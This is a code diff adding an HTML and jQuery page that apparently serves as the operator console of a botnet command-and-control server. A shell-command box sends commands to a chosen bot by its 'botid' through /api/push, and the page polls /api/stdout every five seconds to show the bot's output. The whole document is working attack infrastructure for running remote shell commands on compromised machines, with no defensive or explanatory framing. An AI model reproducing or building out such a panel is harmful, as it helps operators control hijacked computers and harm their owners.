@@ -1,0 +1,35 @@
+<html>
+<body>
+
+Shell command: <input type="text" name="cmd" id="cmd" onkeypress="keypressed(event)" />
+<input type="hidden" name="botid" value="{{botid}}" />
+<button type="submit" onclick="send_command()">Go</button>
+<div id="terminal">
+</div>
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>
+function keypressed(e){
+    if(e.keyCode === 13){
+        send_command();
+    }
+    return false;
+}
+
+function send_command(e) {
+    $.post("/api/push", {'botid': '{{botid}}', 'cmd': $('#cmd').val()});
+    $('#cmd').val('');
+    return false;
+}
+
+function refresh_term() {
+    $('#terminal').load("/api/stdout?botid={{botid}}");
+}
+setInterval(refresh_term, 5000)
+
+$(document).ready(function(){
+    refresh_term();
+});
+</script>
+</body>
+</html>
